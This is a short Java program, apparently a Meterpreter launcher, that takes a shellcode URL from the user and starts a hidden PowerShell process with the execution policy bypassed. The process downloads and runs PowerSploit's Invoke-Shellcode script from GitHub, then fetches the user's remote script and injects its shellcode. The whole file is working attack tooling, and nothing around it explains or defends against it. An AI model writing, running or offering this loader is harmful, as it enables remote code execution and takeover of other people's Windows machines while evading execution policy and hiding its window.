import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Scanner;
 

public class powershellbypassInvokemeterpreter {
 
 /**
  * @param args
  * @throws IOException 
  */
 public static void main(String[] args) throws IOException {
	 System.out.println("Enter Shellcode Site: ");
	 String shellcodesite = new Scanner(System.in).nextLine();
	 String command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1');IEX (New-Object Net.WebClient).DownloadString('"+shellcodesite+"');Invoke-Shellcode -Shellcode @($buf) -Force";
	 Process powerShellProcess = Runtime.getRuntime().exec(command);
	 powerShellProcess.getOutputStream();
	 String line;
	 System.out.println("Output:");
	 BufferedReader stdout = new BufferedReader(new InputStreamReader(
	 powerShellProcess.getInputStream()));
	 while ((line = stdout.readLine()) != null) {
		 System.out.println(line);
	 }
	 stdout.close();
	 System.out.println("Error:");
	 BufferedReader stderr = new BufferedReader(new InputStreamReader(
	 powerShellProcess.getErrorStream()));
	 while ((line = stderr.readLine()) != null) {
		 System.out.println(line);
	 }
	 stderr.close();
	 System.out.println("Done");
 
 	 }
 
}
